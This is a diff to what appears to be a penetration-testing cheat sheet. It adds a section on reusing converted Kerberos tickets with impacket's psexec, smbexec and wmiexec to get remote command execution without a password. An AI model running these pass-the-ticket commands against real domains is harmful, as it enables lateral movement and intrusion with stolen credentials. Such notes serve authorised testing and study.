@@ -57,6 +57,16 @@ REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem" /v Long
 python3 ticket_converter.py Administrator.kirbi Administrator.ccache
 ````
 
+#### Use tickets with impacket
+```
+export KRB5CCNAME=<TGT_ccache_file>
+python3 script.py -k -no-pass
+
+python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+```
+
 ## PSSession
 #### Save pssession in variable
 ```
